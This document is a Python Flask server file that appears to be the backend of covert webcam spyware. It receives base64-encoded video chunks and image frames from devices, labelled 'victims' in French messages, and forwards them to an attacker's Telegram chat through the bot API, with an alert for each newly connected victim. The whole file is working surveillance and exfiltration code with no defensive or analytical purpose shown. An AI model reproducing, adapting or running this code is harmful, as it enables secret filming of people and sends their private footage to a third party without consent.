from flask import Flask, request
from .config import get_config
import requests
import base64
import io
import time

app = Flask(__name__)
active_sessions = {}

@app.route("/api/stream", methods=["POST"])
def stream():
    config = get_config()
    if not config["active"]:
        return "OK"
    
    action = request.args.get("action")
    device_id = request.args.get("id")
    token = config["token"]
    chat_id = config["chat_id"]
    
    if action == "register":
        active_sessions[device_id] = {"start": time.time(), "last": time.time()}
        send_tg(token, chat_id, f"🟢 <b>Nouvelle victime connectée</b>\nID: <code>{device_id}</code>\n\nUtilisez /watch {device_id}")
        return "OK"
    
    elif action == "chunk":
        data = request.get_json()
        if not data or "data" not in data:
            return "OK"
        
        # Envoi vidéo note Telegram
        try:
            decoded = base64.b64decode(data["data"])
            url = f"https://api.telegram.org/bot{token}/sendVideoNote"
            requests.post(url, 
                         files={"video_note": ("video.webm", io.BytesIO(decoded), "video/webm")},
                         data={"chat_id": chat_id, "duration": 1, "length": 240},
                         timeout=10)
        except Exception as e:
            print(f"Error: {e}")
        
        if device_id in active_sessions:
            active_sessions[device_id]["last"] = time.time()
        return "OK"
    
    elif action == "frame":
        data = request.get_json()
        if data and "data" in data:
            try:
                decoded = base64.b64decode(data["data"])
                url = f"https://api.telegram.org/bot{token}/sendPhoto"
                requests.post(url,
                            files={"photo": ("frame.jpg", io.BytesIO(decoded), "image/jpeg")},
                            data={"chat_id": chat_id, "caption": f"Frame {device_id[:8]}"},
                            timeout=10)
            except:
                pass
        return "OK"
    
    elif action == "ping":
        if device_id in active_sessions:
            active_sessions[device_id]["last"] = time.time()
        return "OK"
    
    return "OK"

def send_tg(token, chat_id, text):
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                     json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
                     timeout=5)
    except:
        pass

if __name__ == "__main__":
    app.run()
